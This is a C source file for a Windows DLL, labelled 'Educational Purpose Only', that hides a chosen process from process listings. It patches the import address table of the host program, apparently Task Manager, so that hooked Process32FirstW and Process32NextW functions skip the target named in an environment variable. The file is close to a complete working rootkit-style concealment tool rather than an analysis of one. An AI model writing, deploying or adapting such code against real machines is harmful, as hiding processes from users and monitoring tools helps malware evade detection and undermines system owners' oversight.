/**
 * Windows Process Hiding Library - Educational Purpose Only
 * 
 * Simplified version with reliable IAT hooking for 64-bit Windows
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// Target process name (set by environment variable)
static WCHAR g_targetProcess[MAX_PATH] = {0};
static DWORD g_targetPID = 0;

// Original function pointers
typedef BOOL (WINAPI *PROCESS32FIRSTW_PROC)(HANDLE, LPPROCESSENTRY32W);
typedef BOOL (WINAPI *PROCESS32NEXTW_PROC)(HANDLE, LPPROCESSENTRY32W);

static PROCESS32FIRSTW_PROC g_originalProcess32FirstW = NULL;
static PROCESS32NEXTW_PROC g_originalProcess32NextW = NULL;

// Get PID from process name
DWORD GetPIDFromProcessName(LPCWSTR processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    
    DWORD pid = 0;
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return pid;
}

// Hook Process32FirstW to skip target process
BOOL WINAPI HookedProcess32FirstW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe) {
    // Call original function first
    if (!g_originalProcess32FirstW) {
        g_originalProcess32FirstW = (PROCESS32FIRSTW_PROC)GetProcAddress(
            GetModuleHandleW(L"kernel32.dll"), "Process32FirstW");
    }
    
    BOOL result = g_originalProcess32FirstW(hSnapshot, lppe);
    
    // Skip target process if found
    while (result && g_targetProcess[0] != L'\0') {
        if (_wcsicmp(lppe->szExeFile, g_targetProcess) == 0 || 
            lppe->th32ProcessID == g_targetPID) {
            // Get next process instead
            result = g_originalProcess32FirstW ? 
                Process32NextW(hSnapshot, lppe) : FALSE;
        } else {
            break;
        }
    }
    
    return result;
}

// Hook Process32NextW to skip target process
BOOL WINAPI HookedProcess32NextW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe) {
    if (!g_originalProcess32NextW) {
        g_originalProcess32NextW = (PROCESS32NEXTW_PROC)GetProcAddress(
            GetModuleHandleW(L"kernel32.dll"), "Process32NextW");
    }
    
    BOOL result;
    
    // Keep getting next process until we find one that's not our target
    do {
        result = g_originalProcess32NextW(hSnapshot, lppe);
        if (!result) break;
        
        // If this is our target process, skip it
        if (g_targetProcess[0] != L'\0' && 
            (_wcsicmp(lppe->szExeFile, g_targetProcess) == 0 || 
             lppe->th32ProcessID == g_targetPID)) {
            continue;  // Skip this one
        }
        
        break;  // Found a process that's not our target
    } while (result);
    
    return result;
}

// Simple IAT patching function
BOOL PatchIAT(HMODULE hModule, LPCSTR targetDLL, LPCSTR functionName, LPVOID newFunction) {
    if (!hModule || !targetDLL || !functionName || !newFunction) return FALSE;
    
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return FALSE;
    
    DWORD importRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (importRVA == 0) return FALSE;
    
    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)hModule + importRVA);
    
    while (importDesc->Name) {
        LPCSTR dllName = (LPCSTR)((BYTE*)hModule + importDesc->Name);
        
        if (_stricmp(dllName, targetDLL) == 0) {
            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + importDesc->FirstThunk);
            PIMAGE_THUNK_DATA origThunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + importDesc->OriginalFirstThunk);
            
            while (thunk->u1.Function && origThunk->u1.Ordinal) {
                if (!(origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)) {
                    PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)((BYTE*)hModule + origThunk->u1.AddressOfData);
                    
                    if (strcmp((char*)importByName->Name, functionName) == 0) {
                        DWORD oldProtect;
                        if (VirtualProtect(&thunk->u1.Function, sizeof(LPVOID), PAGE_READWRITE, &oldProtect)) {
                            thunk->u1.Function = (DWORD_PTR)newFunction;
                            VirtualProtect(&thunk->u1.Function, sizeof(LPVOID), oldProtect, &oldProtect);
                            return TRUE;
                        }
                    }
                }
                thunk++;
                origThunk++;
            }
        }
        importDesc++;
    }
    
    return FALSE;
}

// DLL Entry Point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    switch (dwReason) {
        case DLL_PROCESS_ATTACH: {
            // Get target process from environment variable
            CHAR envBuffer[MAX_PATH];
            DWORD result = GetEnvironmentVariableA("TARGET_PROCESS", envBuffer, MAX_PATH);
            
            if (result > 0 && result < MAX_PATH) {
                // Convert to wide string
                MultiByteToWideChar(CP_ACP, 0, envBuffer, -1, g_targetProcess, MAX_PATH);
                
                // Get PID of target process
                g_targetPID = GetPIDFromProcessName(g_targetProcess);
                
                // Log to a file for debugging
                HANDLE hLogFile = CreateFileW(L"C:\\process_hider_debug.txt", 
                    GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 
                    FILE_ATTRIBUTE_NORMAL, NULL);
                if (hLogFile != INVALID_HANDLE_VALUE) {
                    WCHAR logMsg[256];
                    swprintf_s(logMsg, 256, L"DLL loaded. Target: %ls, PID: %lu\r\n", 
                        g_targetProcess, g_targetPID);
                    DWORD written;
                    WriteFile(hLogFile, logMsg, (DWORD)(wcslen(logMsg) * sizeof(WCHAR)), &written, NULL);
                    CloseHandle(hLogFile);
                }
                
                // Patch IAT for current module (taskmgr.exe)
                HMODULE hCurrentModule = GetModuleHandleW(NULL);
                if (hCurrentModule) {
                    PatchIAT(hCurrentModule, "kernel32.dll", "Process32FirstW", HookedProcess32FirstW);
                    PatchIAT(hCurrentModule, "kernel32.dll", "Process32NextW", HookedProcess32NextW);
                }
            }
            break;
        }
        
        case DLL_PROCESS_DETACH:
            // Cleanup if needed
            break;
    }
    
    return TRUE;
}
